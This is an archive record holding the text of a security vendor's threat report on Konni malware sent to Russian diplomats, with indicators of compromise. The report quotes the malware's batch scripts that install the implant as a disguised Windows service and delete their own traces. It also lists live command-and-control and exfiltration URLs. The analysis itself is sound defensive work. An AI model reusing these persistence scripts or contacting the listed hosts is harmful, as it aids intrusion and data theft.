{
    "id": "3d7d16c0-76af-4486-839e-4055ac79b492",
    "created_at": "2022-10-25T16:48:13.238816Z",
    "updated_at": "2025-03-27T02:12:44.242739Z",
    "deleted_at": null,
    "sha1_hash": "9a4bfa953645a026d375321eef37b893847d80ad",
    "title": "",
    "authors": "",
    "file_creation_date": "2022-01-03T17:37:51Z",
    "file_modification_date": "2022-01-03T17:38:29Z",
    "file_size": 3210410,
    "plain_text": "01 // 03 // 2022\n\n**TLP:WHITE**\n\n### NORTH KOREAN GROUP “KONNI” TARGETS THE RUSSIAN DIPLOMATIC SECTOR WITH NEW VERSIONS OF MALWARE IMPLANTS\n\n\n### THE RUSSIAN DIPLOMATIC SECTOR WITH NEW VERSIONS OF MALWARE IMPLANTS\n\nwww.cluster25.io\n\n@cluster25_io\n\n\n-----\n\n# TABLE OF CONTENTS\n\n###### KILLCHAIN OVERVIEW 4\n\n INITIAL ACCESS 4\n\n DOWNLOADER ANALYSIS 5\n\n KONNI RAT ANALYSIS 10\n\n ATTRIBUTION 13\n\n ATT&CK MATRIX 14\n\n INDICATORS OF COMPROMISE 16\n\n ABOUT CLUSTER25 19\n\n2022 // © Cluster25\n\n\n-----\n\n## EXECUTIVE SUMMARY\n\n##### Cluster25 analyzed a recent attack linked to the\n\n\n##### Cluster25 analyzed a recent attack linked to the\n\n North Korean APT group “Konni” targeting\n\n Russian diplomatic sector using a spear phishing\n\n theme for New Year's Eve festivities as lure. Once\n\n the malicious email attachment is opened and\n\n executed, a chain composed by multiple stages is\n\n\n-----\n\nUnrestricted // freely shareable content\n\n#### 01 KILLCHAIN OVERVIEW\n\nThe following diagram shows the overall phases used by the actor to infect the target. The\n\nmalicious activity starts from an email containing a malicious zip file, which once decompressed\n\ndrops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni\n\nRAT malware, named scrnsvc.dll, as Windows service.\n\n#### 02 INITIAL ACCESS\n\nC25 has traced an activity that started at least from August 2021 aimed at Russian targets\n\noperating in the diplomatic sector.\n\n\n-----\n\nUnrestricted // freely shareable content\n\nOn December 20th emails crafted to infect the Russian embassy located in Indonesia have been\n\ndetected; these emails used the New Year Eve 2022 festivity as decoy theme. Contrary to its\n\npast actions, the North Korean APT group this time did not use malicious documents as\n\nattachments; instead, they attached a .zip file type named “поздравление.zip”, which means\n\n“congratulation” in Russian, containing an embedded executable representing the first stage of\n\nthe infection. The emails were spoofed using a *@mid.ru account as a sender to pretend that it\n\nwas sent from the Russian Embassy in Serbia.\n\n#### 03 DOWNLOADER ANALYSIS\n\nThe artifact found and extracted from the zip is a Windows x32 executable, named\n\n“поздравление.scr” and compiled in date Mon Dec 20 09:16:02 2021. From the recent\n\ncompilation date, it seems to have been developed specifically for the attack under analysis, and\n\nit can be identified by the following hash:\n\n\nSHA256\n\n\ncdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5\n\n\n-----\n\nUnrestricted // freely shareable content\n\nThe sample has the behavior of a trojan malware, and it is intended to resemble the legitimate\n\nscrnsave.scr Windows application. When executed, it drops under the %TEMP% directory an\n\nimage named Happy.jpg (which is embedded in the resource section) and opens it as a\n\nforeground window to trick the victim into believing that it is a legitimate Russian themed happy\n\nholidays screensaver.\n\nSubsequently, in the background, the malware starts its malicious activities by downloading the\n\nnext stage payload from an HTTP GET request to the Command-and-Control domain\n\ni758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756\n\nand a type used as a flag to specify if the infected machine was 32 or 64 bit. The Command-and\nControl Apache webserver response was configured to respond with HTTP status code 401,\n\nhaving the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks),\n\nreturning as a response, in any case, a compressed CAB file encoded in base64 visible in the\n\nevidence below.\n\n\n-----\n\nUnrestricted // freely shareable content\n\nAfter the CAB downloading, the malware starts the file decompression using expand.exe process\n\nlogging a file named - a.log - when the decompression is finished. The following image illustrates\n\nthe snipped of code described.\n\n\n-----\n\nUnrestricted // freely shareable content\n\nTo optimize the time wasted during CAB decompression, the malware writes and executes the\n\nfollowing BAT file into the %TEMP% directory, which was contained in the data section encoded\n\nin base64:\n\n\nCODE\n\n\n@ECHO OFF\n\nCD /D %TEMP%\n\n: WAITING\n\nTIMEOUT /T 1\n\nIF NOT EXIST \"A.LOG\" (GOTO WAITING)\n\nDEL /F /Q \"A.LOG\"\n\nINSTALL.BAT\n\nDEL /F /Q \"%~DPNX0”\n\nThe script’s scope is to wait for the decompression to finish by using the creation of a.log file as\n\nflag and automatically execute the content of the CAB extraction, which is the install.bat file (one\n\nof the files contained into the CAB), and finally delete itself using \"%~DPNX0”, a bat script\n\nconvention used to specify the BAT file itself. As previously described the CAB file’s\n\ndecompressed content contains the following files:\n\n  - Install.bat\n\n  - scrnsvc.ini\n\n  - scrnsvc.dll\n\nInstall.bat file is the launcher of the next stage infection, which hides the tracks of the previous\n\nactivities by moving all the files into the System32 directory and installing and starting the final\n\n\n-----\n\nUnrestricted // freely shareable content\n\nimplant scrnsvc.dll as a Windows service named ScreenSaver Management Service, which,\n\nwhen registered, loads the configuration file scrnvsvc.ini. The Windows service is installed by\n\nconfiguring svchost.exe as a process container of the DLL executable representing Konni RAT\n\nmalware. Install.bat has already been seen among the TTPs belonging to this threat actor, which\n\ncontent is visible below, where, in this case, it appears to have been slightly modified, and therefore\n\nmore likely to deceive detection signatures referring to files used in previous intrusions.\n\n\nCODE\n\n\n@echo off\n\nset DSP_NAME=\"ScreenSaver Management Service\"\n\nsc stop scrnsvc > nul\n\necho %~dp0 | findstr /i \"system32\" > nul\n\nif %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE)\n\n: COPYFILE\n\ncopy /y \"%~dp0\\scrnsvc.dll\" \"%windir%\\System32\" > nul\n\ndel /f /q \"%~dp0\\scrnsvc.dll\" > nul\n\ncopy /y \"%~dp0\\scrnsvc.ini\" \"%windir%\\System32\" > nul\n\ndel /f /q \"%~dp0\\scrnsvc.ini\" > nul\n\ndel /f /q \"%windir%\\System32\\scrnsvc.dat\" > nul\n\n: INSTALL\n\nsc create scrnsvc binpath= \"%windir%\\System32\\svchost.exe -k scrnsvc\" DisplayName= %DSP_NAME% > nul\n\nsc description scrnsvc %DSP_NAME% > nul\n\nsc config scrnsvc type= interact type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k scrnsvc\"\n\n- nul\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v scrnsvc /t REG_MULTI_SZ /d \"scrnsvc\" /f >\n\nnul\n\n\n-----\n\nUnrestricted // freely shareable content\n\n\nCODE\n\n\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\scrnsvc\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d\n\n\"%windir%\\System32\\scrnsvc.dll\" /f > nul\n\nsc start scrnsvc > nul\n\ndel /f /q \"%~dp0\\wpnprv.dll\" > nul\n\ndel /f /q \"%~dp0\\*.bat\" > nul\n\ndel /f /q \"%~dpnx0\" > nul\n\n#### 04 KONNI RAT ANALYSIS\n\nThe following Konni Rat version is a x64 DLL executable, which has as compile timestamp Mon\n\nDec 20 09:02:38 2021 - UTC, same date of the downloader, and where the payload is contained\n\nin its export function ServiceMain and is directly invoked when registered as Windows service.\n\nCluster25 retrieved two different samples of the same Konni version identified by the following\n\nhashes:\n\n\nSHA256\n\n\ncdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5\n\n\n8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83\n\nOnce registered as a service, the malware starts solving in runtime all the WinAPIs needed to\n\ninterface with the infected operating system's file system and to communicate with the control\n\nand monitoring server. The exported functions loaded belong to the following libraries:\n\n  - kernel32.dll\n\n  - advapi23.dll\n\n  - urlmon.dll\n\n\n-----\n\nUnrestricted // freely shareable content\n\n  - wininet.dll\n\n  - shell32.dll\n\nIt then creates a pointer memory structure used to store the configuration used by the malware\n\nduring execution, which contains information such as the name of the computer, the time of\n\nseconds to remain asleep, the domain used to communicate with the adversary command and\n\ncontrol, and all the information collected during the future enumeration. The configuration\n\nstructure is then passed as argument at a new thread created which is used as main routine by the\n\nmalware to perform the network communications and exfiltration, as visible in the following code\n\nsnippet.\n\nThe thread starts verifying if there is Internet connection available, remaining in sleep if not, then\n\nadds the value 65001 into the Registry key in Console Codepage, to make Unicode character set\n\nin cmd.exe by default, and collects data:\n\n  - Enumerated cached website via FindFirstUrlCacheEntryW and\n\nFindNextUrlCacheEntryW\n\n  - Enumerated operating system information using cmd /c systeminfo\n\n  - Enumerated processes using cmd /c tasklist.exe\n\n\n-----\n\nUnrestricted // freely shareable content\n\nOnce the enumeration has been completed, it stores all the info into temporary files which will then\n\nbe converted into a CAB file using cmd /c makecab and furtherly encrypted and sent to the\n\nattacker server via HTTP POST request body to\n\nhxxp://455686[.]c1[.]biz/up[.]php?name=%COMPUTER-NAME%, passing the operating\n\nsystem computer name as parameter as evidences in the network dump reported following:\n\nIf the server response does not contain the string “success!” the malware tries to resend the\n\nrequest, or it starts to send HTTP GET loop requests to receive commands from the server located\n\nat hxxp://455686[.]c1[.]biz /dn.php?name=%COMPUTERNAME%&prefix=tt. The commands\n\nreceived are parsed from the response and, if containing the character ”>” are executed via\n\nCreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid\n\nexceptions during output redirection of the file writing, being the sample located in System32\n\nfolder), otherwise using the CreateProcessW function.\n\n\n-----\n\nUnrestricted // freely shareable content\n\nAt the time of the analysis the server was up but it did not provide the commands to be executed,\n\nprobably because the actor set up the Command and Control backend with some form of\n\ngeofencing validation.\n\n#### 05 ATTRIBUTION\n\nCluster25 attributes these intrusion attempts with high degree of confidence to the North Korean\n\ngroup known as Konni. Konni is also the name of their custom RAT which presents intelligence\n\ngathering features. In this case the final implant is a new version of Konni RAT having code and\n\nbehavioral similarities with its previous versions. The reported kill-chain shows overlaps with the\n\nTTPs already linked to this group as the use of CAB files as infection stage and the use of bat file\n\nto automatically install Konni RAT as a service. Identifiable modifications are evident in the pattern\n\nused for the initial access phase, most likely put in place to exploit the holiday time of year as bait.\n\n\n-----\n\nUnrestricted // freely shareable content\n\nFinally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" (AS44476) as\n\nhosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the\n\nCommand and Controls hostnames. Specifically, atwebpages dot com appears to be commonly\n\nobservable in intrusions relating to threat actors belonging to the Kimsuki umbrella.\n\n#### 06 ATT&CK MATRIX\n\n|TACTIC|TECHNIQUE NAME|Col3|\n|---|---|---|\n|Initial Access T1566 Phishing|||\n|T1059 Command and Scripting Interpreter Execution T1204 User Execution T1569 System Services|||\n|Persistence T1543 Create or Modify System Process|||\n|T1543 Create or Modify System Process Privilege Escalation T1134 Access Token Manipulation|||\n|||Access Token Manipulation|\n\n\n-----\n\nUnrestricted // freely shareable content\n\n|TACTIC|TECHNIQUE NAME|Col3|\n|---|---|---|\n|T1134 Access Token Manipulation Defense Evasion T1140 Deobfuscate/Decode Files or Information|||\n|T1082 System Information Discovery Discovery T1057 Process discovery T1033 System Owner/User Discovery|||\n|T1560 Archive Collected Data T1113 Screen Capture Collection T1119 Automated Collection|||\n|T1071 Application Layer Protocol Command and Control Data encoding|||\n|||Data encoding|\n\n\n-----\n\nUnrestricted // freely shareable content\n\nTACTIC TECHNIQUE\n\nT1132\n\nT1020\n\nExfiltration\n\n1041\n\n#### 07 INDICATORS OF COMPROMISE\n\n|TACTIC|TECHNIQUE NAME|Col3|\n|---|---|---|\n|T1132|||\n|T1020 Automated Exfiltrated Exfiltration 1041 Exfiltration Over C2 Channel|||\n|||Exfiltration Over C2 Channel|\n\n|CATEGORY|TYPE|VALUE|\n|---|---|---|\n||||\n\n\nPAYLOAD-DELIVERY SHA256 53b687202e69dd8d5e2e841036c96a12b93971c9ff99ca54c109c491e7ad8eba\n\n|PAYLOAD-DELIVERY SHA1 189fdac8fd88d61ba9cbd4f7d27561a6f60a9666|Col2|Col3|\n|---|---|---|\n|PAYLOAD-DELIVERY MD5 ad152ab451527cf2baa96304c6ecd383|||\n|PAYLOAD-DELIVERY SHA256 72185f9dbf66d0e5dc0e1873934c183bc120708085c0de8a0e2a748f10f77de8|||\n|PAYLOAD-DELIVERY SHA1 b433cc324a785e1d0291c961e2816e91a9549057|||\n|PAYLOAD-DELIVERY MD5 3462e40caeec0fa52bd3c04ad8cbc9d3|||\n|PAYLOAD-DELIVERY|SHA256|451b9d4144555fcc791231db73ef3bfdb6ffddeb655e07a457108766f0e6ad39|\n\n\n-----\n\nUnrestricted // freely shareable content\n\n\nPAYLOAD-DELIVERY SHA1 fb7d9bc8309f589e39e091ef5a7b08260596ffcd\n\n|PAYLOAD-DELIVERY MD5 8ec9a6ff22c497375b53344cafeb2292|Col2|Col3|\n|---|---|---|\n|PAYLOAD-DELIVERY SHA256 4ca8ac99b2416d8fae67a8b18a58c8d267b7e2b72af1ee0369f2470a030af8c7|||\n|PAYLOAD-DELIVERY SHA1 6883e1c2c1f3656cb756264fde77f88ebcde541c|||\n|PAYLOAD-DELIVERY MD5 446ea8033ae343971312745c79fced2e|||\n|PAYLOAD-DELIVERY SHA256 b6845a436df2b3a79dd1b0e4a57a06c60f718eee0272a3eb81183ee4750037b9|||\n|PAYLOAD-DELIVERY SHA1 191604259def68250272919214aea109503200fe|||\n|PAYLOAD-DELIVERY MD5 8269e1b2afaa832e7900640ebfe44bb4|||\n|PAYLOAD-DELIVERY SHA256 24f5fb91ca41e4a191a44629f064fa14c4063b7cda68ebc2b7afb7e68a9d3cdd|||\n|PAYLOAD-DELIVERY SHA1 f08c033d1a9f2f75a17cbcb71e3041263d2d3e61|||\n|PAYLOAD-DELIVERY MD5 58560f053a099104b0f8ac1c9fed2903|||\n|PAYLOAD-DELIVERY SHA256 a3cd08afd7317d1619fba83c109f268b4b60429b4eb7c97fc274f92ff4fe17a2|||\n|PAYLOAD-DELIVERY SHA1 c1d312762d598831d431b08e47075047582856aa|||\n|PAYLOAD-DELIVERY|MD5|57a22e74ba27b034613b0c6ac54a10d5|\n\n\n-----\n\nUnrestricted // freely shareable content\n\n\nPAYLOAD-DELIVERY SHA256 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83\n\n|PAYLOAD-DELIVERY SHA1 fc54cefe956ed5360418c0165cf2a687bbeb62fc|Col2|Col3|\n|---|---|---|\n|PAYLOAD-DELIVERY MD5 954fe31816f2f7f095244573de8f9086|||\n|CNC HOSTNAME i758769.atwebpages.com|||\n|CNC HOSTNAME 455686.c1.biz|||\n|CNC HOSTNAME h378576.atwebpages.com|||\n|DROP-POINT URL http://i758769.atwebpages.com/index.php?user_id=18756&type=1|||\n|CNC URL http://455686.c1.biz/dn.php?name=HOME-DESK&prefix=tt|||\n|CNC|URL|http://h378576.atwebpages.com /dn.php?name=HOME-DESK&prefix=tt|\n\n\n-----\n\n###### ABOUT CLUSTER25\n\nCluster25 is the internal Cyber Intelligence Research\n\nand Adversary Hunting Unit at DuskRise Inc. Cluster25\n\nexperts are specialized in hunting and collecting cyber\n\nthreats, analysis, reverse-engineering and adversary\n\nhunting practices. Cluster25 independently designs\n\nand develops technologies aimed at the classification\n\nand categorization of malicious artifacts as well as for\n\ntheir correlation with known threat groups. Relying on\n\nextensive visibility into the digital threat landscape, it\n\novercomes the usual limitations of services based on\n\n_ex-post threat observation by providing real predictive_\n\nand proactive intelligence services.\n\nVisit us at cluster25.io\n\nIMPORTANT NOTICE:\n\n©2021 Cluster25. All rights reserved. The reproduction and\n\ndistribution of this material is prohibited without express written\n\npermission from Cluster25. Traffic Light Protocol (TLP) violation\n\ncould lead to the immediate cancellation of existing services as well\n\nas the initiation of legal actions aimed at protecting the intellectual\n\nproperty and competitive advantage of DuskRise Inc. Given the\n\ninherent nature of threat intelligence, the content contained in this\n\nreport is based on information gathered and understood at the time\n\nof its creation. The information in this report is general in nature and\n\ndoes not take into account the specific needs of your IT ecosystem\n\nand network, which may vary and require unique action. As such,\n\nCluster25 provides the information and content on an “as-is” basis\n\nwithout representation or warranty and accepts no liability for any\n\naction or failure to act taken in response to the information\n\ncontained or referenced in this report. The reader is responsible for\n\ndetermining whether or not to follow any of the suggestions,\n\nrecommendations or potential mitigations set out in this report,\n\nentirely at their own discretion.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2022/2022.01.03.KONNI_Targets_Russian_Diplomatic/Konni_targeting_Russian_diplomatic_sector.pdf",
        "https://cluster25.io/wp-content/uploads/2022/01/Konni_targeting_Russian_diplomatic_sector.pdf"
    ],
    "report_names": [
        "Konni_targeting_Russian_diplomatic_sector",
        "Konni_targeting_Russian_diplomatic_sector.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b43c8747-c898-448a-88a9-76bff88e91b5",
            "created_at": "2024-02-02T02:00:04.058535Z",
            "updated_at": "2025-03-27T02:00:03.302832Z",
            "deleted_at": null,
            "main_name": "Opal Sleet",
            "aliases": [
                "OSMIUM",
                "Konni",
                "Vedalia"
            ],
            "source_name": "MISPGALAXY:Opal Sleet",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b9458777-d970-4e89-b2d2-e532140a390f",
            "created_at": "2024-05-01T02:03:08.140328Z",
            "updated_at": "2025-03-27T02:05:17.41728Z",
            "deleted_at": null,
            "main_name": "NICKEL JUNIPER",
            "aliases": [
                "OSMIUM ",
                "Opal Sleet ",
                "Konni"
            ],
            "source_name": "Secureworks:NICKEL JUNIPER",
            "tools": [
                "KONNI"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041564,
    "ts_creation_date": 1641231471,
    "ts_modification_date": 1641231509,
    "files": {
        "pdf": "https://archive.orkl.eu/9a4bfa953645a026d375321eef37b893847d80ad.pdf",
        "text": "https://archive.orkl.eu/9a4bfa953645a026d375321eef37b893847d80ad.txt",
        "img": "https://archive.orkl.eu/9a4bfa953645a026d375321eef37b893847d80ad.jpg"
    }
}